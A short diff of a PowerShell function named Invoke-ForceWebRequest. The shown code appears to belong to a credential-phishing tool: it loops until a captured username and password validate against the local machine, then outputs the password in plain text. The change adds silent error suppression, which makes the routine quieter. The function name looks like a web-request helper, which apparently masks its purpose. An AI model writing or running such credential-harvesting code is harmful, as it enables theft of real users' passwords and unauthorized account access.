@@ -37,7 +37,7 @@ function Invoke-ForceWebRequest {
                 $full = "$domain" + "\" + "$username"
                 $password = $cred.GetNetworkCredential().password
                 Add-Type -assemblyname System.DirectoryServices.AccountManagement
-                $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+                $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) -ErrorAction SilentlyContinue
             } while($DS.ValidateCredentials("$full", "$password") -ne $True);
             
             $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
